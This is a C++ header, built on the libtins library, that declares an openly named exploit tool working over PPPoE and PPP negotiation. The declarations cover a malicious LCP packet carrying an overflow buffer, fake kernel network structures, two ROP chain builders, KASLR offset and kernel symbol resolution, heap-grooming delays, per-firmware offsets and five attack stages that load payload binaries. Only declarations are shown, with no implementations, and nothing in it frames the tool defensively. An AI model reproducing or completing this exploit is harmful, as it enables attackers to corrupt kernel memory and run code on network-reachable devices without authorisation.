#pragma once

#include <functional>
#include <Tins/Tins.h>

#include "offset.h"
#include "defines.h"

#ifdef DEBUG
#define hexdump(p) PacketBuilder::hexPrint(p)
#define hexdump_verbose(p) (void) p
#else
#define hexdump(p) (void) p
#define hexdump_verbose(p) (void) p
#endif

class PacketBuilder {
public:
    static void hexPrint(const Tins::PDU &packet);

    static Tins::EthernetII lcpEchoReply(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                         uint16_t session, uint8_t id, uint32_t magic_number);

    static Tins::EthernetII pado(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                 const uint8_t *ac_cookie, size_t ac_cookie_len,
                                 const uint8_t *host_uniq, size_t host_uniq_len);

    static Tins::EthernetII pads(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                 const uint8_t *host_uniq, size_t host_uniq_len);

    static Tins::EthernetII padt(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac);

    static Tins::EthernetII lcpRequest(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac);

    static Tins::EthernetII lcpAck(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac, uint8_t id);

    static Tins::EthernetII ipcpRequest(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac);

    static Tins::EthernetII ipcpNak(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac, uint8_t id);

    static Tins::EthernetII ipcpAck(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac, uint8_t id,
                                     const uint8_t *option, size_t option_len);

    static Tins::EthernetII icmpv6Echo(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                       const Tins::IPv6Address &source_ipv6, const Tins::IPv6Address &target_ipv6);

    static Tins::EthernetII icmpv6Na(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                     const Tins::IPv6Address &source_ipv6, const Tins::IPv6Address &target_ipv6);

    static Tins::EthernetII pinCpu0(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac);

    static Tins::EthernetII maliciousLcp(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac,
                                         const uint8_t *overflow, size_t overflow_len);

    static Tins::EthernetII lcpTerminate(const Tins::HWAddress<6> &source_mac, const Tins::HWAddress<6> &target_mac);

    static Tins::PPPSession *getPPPoESessionLayer(const Tins::EthernetII &ethernet_packet, uint16_t pppType);

    static Tins::PPPoEDiscovery *getPPPoEDiscoveryLayer(const Tins::EthernetII &ethernet_packet, uint8_t type);
};

class LcpEchoHandler {
public:
    explicit LcpEchoHandler(const std::string &iface);

    void run();

    void stop();

    ~LcpEchoHandler();
private:
    Tins::PacketSender sender;
    bool running{};
};

class Exploit {
public:
    Exploit() = default;

    ~Exploit();

    int setFirmwareVersion(FirmwareVersion version);

    int setInterface(const std::string &iface);

    void setStage1(const std::vector<uint8_t> &&stage1_data);

    void setStage2(const std::vector<uint8_t> &&stage2_data);

    void setTimeout(int timeout);

    void setWaitPADI(bool wait);

    void setGroomDelay(int wait);

    void closeInterface();

    void updateSourceMac(uint64_t value);

    uint64_t kdlsym(uint64_t addr) const;

    int lcp_negotiation() const;

    int ipcp_negotiation() const;

    int ppp_negotiation(const std::function<std::vector<uint8_t>(Exploit *)> &cb = nullptr,
                        bool ignore_initial_req = false);

    void ppp_byebye();

    static std::vector<uint8_t> build_fake_ifnet(Exploit *self);

    static std::vector<uint8_t> build_overflow_lle(Exploit *self);

    static std::vector<uint8_t> build_fake_lle(Exploit *self);

    static std::vector<uint8_t> build_first_rop(Exploit *self, uint64_t fake_lle_len, uint64_t rop2_len);

    static std::vector<uint8_t> build_second_rop(Exploit *self);

    int stage0();

    int stage1();

    int stage2();

    int stage3();

    int stage4();

    int run();

    void stop();

    Tins::PacketSender sender{};
    uint64_t pppoe_softc{};
    uint64_t pppoe_softc_list{};
    uint64_t kaslr_offset{};
    Tins::HWAddress<6> target_mac, source_mac;
    Tins::IPv6Address target_ipv6;
    OffsetsFirmware offs{};
    std::vector<uint8_t> stage1_bin{};
    std::vector<uint8_t> stage2_bin{};
    bool auto_retry{};
    bool wait_padi{};
    int timeout{};
    int groom_delay{4};
};
